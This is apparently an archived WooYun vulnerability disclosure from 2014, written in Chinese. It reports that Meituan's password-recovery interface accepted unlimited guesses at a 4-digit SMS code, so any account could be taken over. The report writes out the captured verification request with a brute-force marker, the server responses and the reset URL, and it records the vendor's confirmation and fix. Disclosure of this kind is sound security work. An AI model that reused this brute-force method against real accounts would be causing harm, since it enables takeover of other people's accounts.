@@ -1,0 +1,220 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		美团网某接口设计缺陷导致任意用户密码重置  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		美团网某接口设计缺陷导致任意用户密码重置  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/se55i0n">se55i0n</a> 
+</li><li>提交时间：		2014-02-08 14:36</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-02-08：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-02-08：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-02-18：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-28：	细节向普通白帽子公开<br/>
+									2014-03-10：	细节向实习白帽子公开<br/>
+									2014-03-25：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">happy new year:)</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">昨天用美团团了几张电影票，在电影院取票的时候发现了猫眼的终端，一看是美团的，今天就看了下，结果就有了这个洞子：）<br />
+<br />
+<br />
+<br />
+1）存在问题的接口如下，在猫眼的登陆处：<br />
+<br />
+</p><p class="detail"><a href="../images/081349405fcef8449a72ff81c30778a3a44f1a4e.png" target="_blank"><img src="../images/081349405fcef8449a72ff81c30778a3a44f1a4e.png" alt="5.png" width="600"/></a></p><p class="detail"><br />
+<br />
+2）这里使用手机、邮箱、账户名均可进行密码找回操作；<br />
+<br />
+</p><p class="detail"><a href="../images/08135045f8e1b6d9b2f99df8c622e919ad40553f.png" target="_blank"><img src="../images/08135045f8e1b6d9b2f99df8c622e919ad40553f.png" alt="6.png" width="600"/></a></p><p class="detail"><br />
+<br />
+3）相信所有美团的用户肯定都绑定了手机号码的，所以这个缺陷适用于所有美团帐号，4位数纯数字验证码，未限制校验错误次数；<br />
+<br />
+</p><p class="detail"><a href="../images/08135304da6edd3aa1736a817c8ef8daf6b4f7f2.png" target="_blank"><img src="../images/08135304da6edd3aa1736a817c8ef8daf6b4f7f2.png" alt="1.png" width="600"/></a></p><p class="detail"><br />
+<br />
+4）因为是4位纯数字验证码，搞定一个帐号也就分分钟的事情，下面是抓的验证的数据包；<br />
+<br />
+</p><pre><code>POST /risk/verify.json HTTP/1.1<br />
+Host: i.meituan.com<br />
+Proxy-Connection: keep-alive<br />
+Content-Length: 32<br />
+Accept: application/json<br />
+Origin: http://i.meituan.com<br />
+X-Requested-With: XMLHttpRequest<br />
+User-Agent: Mozilla/5.0 <br />
+Content-Type: application/x-www-form-urlencoded<br />
+Referer: http://i.meituan.com/risk/downsms<br />
+Accept-Encoding: gzip,deflate,sdch<br />
+Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,ko;q=0.2,ja;q=0.2<br />
+Cookie: ...<br />
+<br />
+policy=4&amp;=136*******3&amp;value=§1000§</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+在爆破到真实验证码之前系统响应：<br />
+<br />
+</p><pre><code>{&quot;status&quot;:121008,&quot;message&quot;:&quot;验证错误&quot;}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+当获取到真实验证码之后系统会一直响应：<br />
+<br />
+</p><pre><code>{&quot;status&quot;:0,&quot;data&quot;:&quot;/risk/resetpassword&quot;}</code></pre><p class='detail'><br />
+<br />
+5）所有我们对验证码进行暴力破解后，直接访问下面的页面即可完成用户的密码重置；<br />
+<br />
+</p><pre><code>http://i.meituan.com/risk/resetpassword</code></pre><p class='detail'><br />
+<br />
+</p><p class="detail"><a href="../images/08140134e1c035f38027bd16f3d225c21777cf43.png" target="_blank"><img src="../images/08140134e1c035f38027bd16f3d225c21777cf43.png" alt="2.png" width="600"/></a></p><p class="detail"><br />
+<br />
+6)设置攻击者想要重置的密码即可；<br />
+<br />
+</p><p class="detail"><a href="../images/081403012c66836c0d915d950ef9169dc734a99c.png" target="_blank"><img src="../images/081403012c66836c0d915d950ef9169dc734a99c.png" alt="4.png" width="600"/></a></p><p class="detail"><br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">你们懂的，4位数字验证码太不应该~ </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/se55i0n" title="se55i0n">se55i0n</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-050453" title="美团网某接口设计缺陷导致任意用户密码重置">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2014-02-08 16:12</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢关注！已经暂时补上。我们会进一步深挖漏洞形成原因，防止类似错误再次发生！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="50453";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
